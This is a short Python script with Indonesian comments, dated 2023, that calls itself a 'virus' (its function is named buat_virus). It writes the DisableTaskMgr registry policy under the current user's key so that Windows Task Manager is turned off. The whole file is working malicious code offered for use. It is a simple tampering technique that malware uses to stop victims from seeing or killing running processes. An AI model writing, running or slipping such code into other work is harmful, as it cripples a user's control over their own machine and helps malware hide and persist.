##  Author : azronaftara ##
##  Created at : 2023 ##

# >>>> MEMATIKAN TASKMANAGER DI WINDOWS <<<< #

# mengimport module winreg dan membuat alias dari winreg menjadi reg
import winreg as reg

# membuat fungsi atau function untuk membuat virus yang diberi nama buat_virus
def buat_virus(root_key, key_path, key_name, value_type ,value ):
    key = reg.CreateKey(root_key, key_path)
    reg.SetValueEx(key, key_name, 0, value_type, value)
    reg.CloseKey(key)

# membuat objek dari fungsi buat_virus yang sudah dibuat diatas
virus1 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableTaskMgr',
    'value_type': reg.REG_DWORD,
    'value': 1
}

# menjalankan fungsi buat_virus dan memecah setiap key yang ada di object virus1 untuk dijadikan parameter di fungsi buat_virus
buat_virus(**virus1)